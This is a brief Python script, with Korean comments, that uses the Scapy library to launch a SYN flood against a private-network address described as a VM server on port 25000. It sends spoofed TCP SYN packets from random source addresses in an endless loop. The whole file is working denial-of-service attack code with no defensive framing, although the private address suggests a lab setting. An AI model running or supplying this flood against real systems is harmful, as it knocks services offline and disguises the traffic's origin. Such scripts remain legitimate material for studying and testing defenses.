from scapy.all import *

target_ip = "192.168.21.130"  # VM 서버 IP
target_port = 25000

print("Starting SYN Flood attack...")
# 랜덤한 소스 IP로 가짜 SYN 패킷을 초고속 발사
send(IP(dst=target_ip, src=RandIP())/TCP(dport=target_port, flags="S"), loop=1, verbose=0)